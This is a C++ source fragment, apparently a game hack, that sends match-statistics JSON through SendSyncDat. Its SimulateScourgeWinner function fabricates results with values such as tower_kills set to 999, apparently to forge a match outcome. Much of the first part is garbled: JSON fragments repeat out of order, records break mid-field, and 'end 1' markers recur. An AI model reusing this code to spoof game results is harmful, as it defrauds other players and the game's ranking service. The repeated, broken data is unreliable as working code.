	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "227903028,1227895880,1227900746,1227896904,1227896916,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":3,\"new_year_bounty_find\":0,\"new", 1);
	SendSyncDat("dr.x", "game_stats", "_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":1,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":15,\"deat", 1);
	SendSyncDat("dr.x", "game_stats", "hs\":6,\"firestone\":0,\"froststone\":0,\"gold\":6,\"hero\":1332766568,\"id\":4,\"items\":[0,0,0,0,0,0],\"kills\":1,\"left_time\":0,\"neutral_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":37,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":3,\"courier_kills\":0,\"cre", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "ep_denies\":6,\"creep_kills\":55,\"deaths\":7,\"firestone\":0,\"froststone\":0,\"gold\":790,\"hero\":1432510828,\"id\":5,\"items\":[1227901785,12", 1);
	SendSyncDat("dr.x", "game_stats", "27900744,1227895376,1227903025,1227899469,1227902793],\"kills\":3,\"left_time\":0,\"neutral_kills\":4,\"new_year_bounty_find\":0,\"new_ye", 1);
	SendSyncDat("dr.x", "game_stats", "ar_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":14,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":155,\"death", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2,\"firestone\":0,\"froststone\":0,\"gold\":4586,\"hero\":1160786242,\"id\":6,\"items\":[1227900746,1227901785,1227901010,1227897158,1227", 1);
	SendSyncDat("dr.x", "game_stats", "900994,1227899192],\"kills\":17,\"left_time\":0,\"neutral_kills\":36,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kill", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);
	SendSyncDat("dr.x", "game_stats", "s\":0,\"tower_kills\":1},{\"assists\":20,\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":88,\"deaths\":1,\"firestone\":0,\"froststone\":0,", 1);
	SendSyncDat("dr.x", "game_stats", "\"gold\":2070,\"hero\":1215128178,\"id\":7,\"items\":[1227895880,1227900994,1227894863,1227899213,1227902793,1227902028],\"kills\":10,\"lef", 1);
	SendSyncDat("dr.x", "game_stats", "t_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":0},{\"assists\":9,", 1);
	SendSyncDat("dr.x", "game_stats", "\"courier_kills\":0,\"creep_denies\":2,\"creep_kills\":79,\"deaths\":3,\"firestone\":0,\"froststone\":0,\"gold\":2529,\"hero\":1311780946,\"id\":8", 1);
	SendSyncDat("dr.x", "game_stats", ",\"items\":[1227902028,1227896911,1227896153,1227897137,0,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":16,\"new_year_bounty_find\":0,\"", 1);
	SendSyncDat("dr.x", "game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":2},{\"assists\":2,\"courier_kills\":0,\"creep_denies\":0,\"creep_kills\":34,\"d", 1);
	SendSyncDat("dr.x", "game_stats", "eaths\":9,\"firestone\":0,\"froststone\":0,\"gold\":544,\"hero\":1211117643,\"id\":9,\"items\":[1227900746,1227903809,1227895880,1227896116,0", 1);
	SendSyncDat("dr.x", "game_stats", ",0],\"kills\":10,\"left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kill", 1);
	SendSyncDat("dr.x", "game_stats", "s\":2},{\"assists\":9,\"courier_kills\":0,\"creep_denies\":5,\"creep_kills\":68,\"deaths\":1,\"firestone\":0,\"froststone\":0,\"gold\":1350,\"hero", 1);
	SendSyncDat("dr.x", "game_stats", "\":1212365106,\"id\":10,\"items\":[1227902265,1227896907,1227895380,1227896921,1227900994,0],\"kills\":2,\"left_time\":0,\"neutral_kills\":", 1);
	SendSyncDat("dr.x", "game_stats", "0,\"new_year_bounty_find\":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":1}],\"winner\":2}", 1);
	SendSyncDat("dr.x", "game_stats", "end 1", 1);

}

void SimulateScourgeWinner()
{
	SendSyncDat("game_stats", "{\"first_hero_kill_time\":" + std::to_string(9999) + ",\"game_start_time\":" + std::to_string(99999) + ",\"players\":[{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":1,\"dea", "0");
	SendSyncDat("game_stats", "ths\":0,\"firestone\":1,\"froststone\":0,\"gold\":617,\"hero\":1211117636,\"id\":1,\"items\":[1227896131,1227900739,1227901010,1227902265,122", "0");
	SendSyncDat("game_stats", "7896132,0],\"kills\":1,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"towe", "0");
	SendSyncDat("game_stats", "r_kills\":0},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":8,\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":510,\"", "0");
	SendSyncDat("game_stats", "hero\":1214931305,\"id\":2,\"items\":[0,0,1227895375,0,1227896131,0],\"kills\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\"", "0");
	SendSyncDat("game_stats", ":0,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":0", "0");
	SendSyncDat("game_stats", ",\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":421,\"hero\":1160786000,\"id\":3,\"items\":[1227896371,0,0,1227896132,0,0],\"kills\":0,\"", "0");
	SendSyncDat("game_stats", "left_time\":0,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\"", "0");
	SendSyncDat("game_stats", ":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":1,\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":253,\"hero\":1160786520,\"id\":", "0");
	SendSyncDat("game_stats", "4,\"items\":[1227896396,1227900739,1227896131,1227896132,0,0],\"kills\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"", "0");
	SendSyncDat("game_stats", "new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"assists\":0,\"courier_kills\":0,\"creep_denies\":-0,\"creep_kills\":0,\"de", "0");
	SendSyncDat("game_stats", "aths\":0,\"firestone\":1,\"froststone\":0,\"gold\":200,\"hero\":1333027688,\"id\":5,\"items\":[1227896396,1227895897,1227895385,0,0,0],\"kills", "0");
	SendSyncDat("game_stats", "\":0,\"left_time\":9,\"neutral_kills\":0,\"new_year_bounty_find\":1,\"new_year_rare_present_find\":0,\"rax_kills\":0,\"tower_kills\":999},{\"ass", "0");
	SendSyncDat("game_stats", "ists\":0,\"courier_kills\":0,\"creep_denies\":-1,\"creep_kills\":0,\"deaths\":0,\"firestone\":1,\"froststone\":0,\"gold\":160,\"hero\":1315074670,", "0");
